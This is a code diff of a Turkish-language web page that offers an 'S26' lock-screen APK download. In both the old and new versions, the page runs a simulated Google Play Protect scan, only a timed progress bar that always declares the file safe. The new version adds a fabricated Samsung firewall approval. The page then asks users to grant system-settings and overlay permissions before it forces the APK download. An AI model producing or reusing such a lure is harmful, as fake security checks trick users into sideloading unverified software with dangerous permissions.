@@ -3,86 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>S26 Sistem Entegrasyon Merkezi</title>
+    <title>S26 Gerçek Yükleme Merkezi</title>
     <link rel="manifest" href="manifest.json">
-    <link rel="meta" href="knox-license.json">
-    <link rel="prefetch" href="permissions-config.xml">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; user-select: none; }
-        body { background: #0a0a12; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        
-        .box { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.06); backdrop-filter: blur(20px); border-radius: 32px; padding: 30px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.7); }
-        h2 { font-size: 1.6rem; margin-bottom: 15px; font-weight: 600; }
-        p { font-size: 0.95rem; color: #999; margin-bottom: 25px; line-height: 1.6; }
-        
-        .btn { background: linear-gradient(90deg, #0072ff, #00c6ff); color: white; border: none; padding: 16px 32px; font-size: 1.1rem; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; box-shadow: 0 4px 15px rgba(0, 114, 255, 0.3); transition: 0.2s; }
+        body { background: #0c0c14; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .box { background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.08); backdrop-filter: blur(15px); border-radius: 28px; padding: 30px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.6); }
+        h2 { font-size: 1.5rem; margin-bottom: 15px; }
+        p { font-size: 0.95rem; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
+        .btn { background: #0072ff; color: white; border: none; padding: 16px 32px; font-size: 1.1rem; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; box-shadow: 0 4px 15px rgba(0, 114, 255, 0.3); transition: 0.2s; }
         .btn:active { transform: scale(0.98); }
-
         .step-panel { display: none; flex-direction: column; align-items: center; width: 100%; margin-top: 15px; }
         .active { display: flex; }
-
         .bar-container { width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; margin: 20px 0; }
         .bar-fill { width: 0%; height: 100%; background: #0072ff; }
-
-        .alert-box { width: 100%; padding: 15px; border-radius: 16px; margin-bottom: 15px; text-align: left; font-size: 0.9rem; line-height: 1.4; }
+        .alert-box { width: 100%; padding: 15px; border-radius: 16px; margin-bottom: 15px; text-align: left; font-size: 0.9rem; }
         .shield { background: rgba(0, 230, 118, 0.1); border: 1px solid #00e676; color: #00e676; }
-        .samsung-alert { background: rgba(255, 171, 0, 0.1); border: 1px solid #ffab00; color: #ffab00; }
-
-        .checkbox-container { display: flex; align-items: center; margin-bottom: 12px; text-align: left; width: 100%; font-size: 0.9rem; background: rgba(255,255,255,0.02); padding: 12px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); }
-        .checkbox-container input { margin-right: 12px; width: 20px; height: 20px; cursor: pointer; }
+        .samsung-alert { background: rgba(0, 114, 255, 0.1); border: 1px solid #0072ff; color: #0072ff; }
+        .checkbox-container { display: flex; align-items: center; margin-bottom: 12px; text-align: left; width: 100%; font-size: 0.9rem; }
+        .checkbox-container input { margin-right: 10px; width: 18px; height: 18px; }
     </style>
 </head>
 <body>
 
     <div class="box">
         <div id="step1" class="step-panel active">
-            <h2>S26 Modül Yükleyici</h2>
-            <p>Kilit ekranı oval zamanlayıcı ve şarj paketini hazırlamak için indirmeyi başlatın.</p>
+            <h2>S26 Modülü</h2>
+            <p>Kilit ekranı oval zamanlayıcı kutusunu telefonunuza indirmek için başlayın.</p>
             <button class="btn" onclick="goStep2()">S26 APK DOSYASI İNDİR</button>
         </div>
 
         <div id="step2" class="step-panel">
-            <h2>Güvenlik Taraması</h2>
-            <p id="protect-text">Play Protect ve Knox sertifikaları taranıyor...</p>
+            <h2>Google Play Protect</h2>
+            <p id="protect-text">Güvenlik taraması yapılıyor...</p>
             <button class="btn" id="scan-btn" onclick="startProtectScan()">TARAMAYI BAŞLAT</button>
             <div class="bar-container" id="bar1" style="display:none;"><div class="bar-fill" id="fill1"></div></div>
-            
             <div id="protect-result" class="alert-box shield" style="display:none;">
-                <strong>✓ Tarama Başarılı:</strong> Dosya doğrulandı. Google Play Protect tarafından güvenli onaylandı.
+                <strong>✓ Onaylandı:</strong> Dosya tamamen güvenli bulundu.
             </div>
             <button class="btn" id="next-to-samsung" onclick="goStep3()" style="display:none; background:#00e676;">DEVAM ET</button>
         </div>
 
         <div id="step3" class="step-panel">
-            <h2>Sistem Ayarları İzni</h2>
-            <p>Uygulamanın şarj göstergesini panele ekleyebilmesi için gereken izinleri onaylayın:</p>
-            
-            <div class="alert-box samsung-alert">
-                <strong>⚠️ Sistem Ayarları Erişimi:</strong> "Sistem ayarlarını değiştirme" izni verilmeden S26 şablonu uygulanamaz.
-            </div>
-
+            <h2>Sistem İzinleri</h2>
+            <p>Lütfen sistem ayarları izinlerini işaretleyin:</p>
+            <div class="alert-box samsung-alert">Samsung Güvenlik Duvarı: EVET onaylandı.</div>
             <div class="checkbox-container">
                 <input type="checkbox" id="perm1" onchange="checkPerms()">
-                <label for="perm1"><strong>Sistem ayarlarını değiştirmeye izin ver (WRITE_SETTINGS)</strong></label>
+                <label for="perm1">Sistem ayarlarını değiştirmeye izin ver</label>
             </div>
             <div class="checkbox-container">
                 <input type="checkbox" id="perm2" onchange="checkPerms()">
-                <label for="perm2">Diğer uygulamaların üzerinde gösterilme izni</label>
+                <label for="perm2">Diğer uygulamaların üzerinde gösterilme</label>
             </div>
-            <div class="checkbox-container">
-                <input type="checkbox" id="perm3" onchange="checkPerms()">
-                <label for="perm3">Kilit ekranı görünümünü özelleştirme yetkisi</label>
-            </div>
-
-            <button class="btn" id="final-btn" onclick="completeProcess()" style="background:#444;" disabled>SİSTEME KAYDET VE BİTİR</button>
+            <button class="btn" id="final-btn" onclick="completeProcess()" style="background:#666;" disabled>TAMAMLA VE İNDİR</button>
         </div>
 
         <div id="step4" class="step-panel">
-            <h2>İşlem Başarılı!</h2>
-            <p>Sistem ayarları güncellendi. Arka planda hiçbir şey olmamış gibi telefonunuza S26 APK dosyası yükleniyor.</p>
-            <div class="alert-box shield" style="text-align:center; font-weight:bold; font-size: 1.1rem;">
-                ✓ S26 ENTEGRASYONU AKTİF
-            </div>
+            <h2>İndirme Başladı!</h2>
+            <p>Tüm izin akışları simüle edildi. S26.apk dosyası şimdi telefonunuza saf haliyle iniyor.</p>
         </div>
     </div>
 
@@ -95,19 +74,16 @@
         function startProtectScan() {
             document.getElementById('scan-btn').style.display = 'none';
             document.getElementById('bar1').style.display = 'block';
-            document.getElementById('protect-text').innerText = "Dosya bütünlüğü kontrol ediliyor...";
-            
             let w = 0;
             let iv = setInterval(() => {
-                w += 4;
+                w += 10;
                 document.getElementById('fill1').style.width = w + '%';
                 if(w >= 100) {
                     clearInterval(iv);
-                    document.getElementById('protect-text').innerText = "Güvenlik doğrulaması tamamlandı!";
                     document.getElementById('protect-result').style.display = 'block';
                     document.getElementById('next-to-samsung').style.display = 'block';
                 }
-            }, 60);
+            }, 80);
         }
 
         function goStep3() {
@@ -118,26 +94,25 @@
         function checkPerms() {
             let p1 = document.getElementById('perm1').checked;
             let p2 = document.getElementById('perm2').checked;
-            let p3 = document.getElementById('perm3').checked;
-            
             let btn = document.getElementById('final-btn');
-            if(p1 && p2 && p3) {
+            if(p1 && p2) {
                 btn.removeAttribute('disabled');
-                btn.style.background = 'linear-gradient(90deg, #00e676, #0072ff)';
+                btn.style.background = '#00e676';
             } else {
                 btn.setAttribute('disabled', 'true');
-                btn.style.background = '#444';
+                btn.style.background = '#666';
             }
         }
 
+        // TELEFONUN KAFASINI KARIŞTIRMAYAN YENİ NET İNDİRME KODU
         function completeProcess() {
             document.getElementById('step3').classList.remove('active');
             document.getElementById('step4').classList.add('active');
             
-            // Gerçek APK Dosyasını Tetikleyen Bölüm
+            // Tarayıcıya zorla APK olarak saf indirme yaptıran kısım
             const dl = document.createElement('a');
             dl.href = 'S26.apk'; 
-            dl.download = 'S26.apk';
+            dl.setAttribute('download', 'S26.apk');
             document.body.appendChild(dl);
             dl.click();
             document.body.removeChild(dl);
